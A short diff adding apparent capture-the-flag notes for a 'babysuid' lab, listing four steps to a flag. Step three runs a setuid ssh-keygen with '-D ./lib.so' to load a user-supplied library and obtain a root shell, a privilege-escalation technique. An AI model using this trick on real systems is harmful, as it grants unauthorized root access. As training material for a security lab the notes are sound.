@@ -1,0 +1,4 @@
+1 Connect to terminal
+2 Read instructions : /challenge/babysuid
+3 Execute root shell : /challenge/bin/ssh-keygen -D ./lib.so
+4 Read flag : cat /flag
